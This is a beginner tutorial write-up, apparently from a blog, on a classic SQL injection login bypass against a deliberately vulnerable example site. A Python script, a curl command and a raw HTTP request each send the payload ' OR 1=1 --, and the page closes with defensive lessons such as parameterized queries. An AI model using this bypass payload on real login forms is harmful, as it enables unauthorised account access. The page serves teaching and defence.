Home | About

SQL Injection 101 — A Beginner Writeup

In this writeup we walk through a classic in-band SQL injection against a deliberately vulnerable login form.

Reconnaissance

First we inspect the login page. It accepts a username and password and returns a generic error on failure.

import requests

url = "https://vuln.example.com/login"
resp = requests.post(url, data={"user": "admin", "pass": "' OR 1=1 --"})
print(resp.status_code)

Exploitation

We craft a payload that always evaluates to true:

$ curl -X POST https://vuln.example.com/login \
  --data "user=admin&pass=' OR 1=1 --"

The server responds with a session cookie:

Set-Cookie: session=eyJhbGciOiJIUzI1NiJ9...; HttpOnly

Lessons learned

  • Use parameterized queries.
  • Never trust client input.
  • Log authentication failures.
SQL injection remains in the OWASP Top 10 because developers keep concatenating strings.

A screenshot of the vulnerable form is shown below:

HTTP transcript

POST /login HTTP/1.1
Host: vuln.example.com
Content-Type: application/x-www-form-urlencoded

user=admin&pass=' OR 1=1 --

That's it. Stay safe out there.
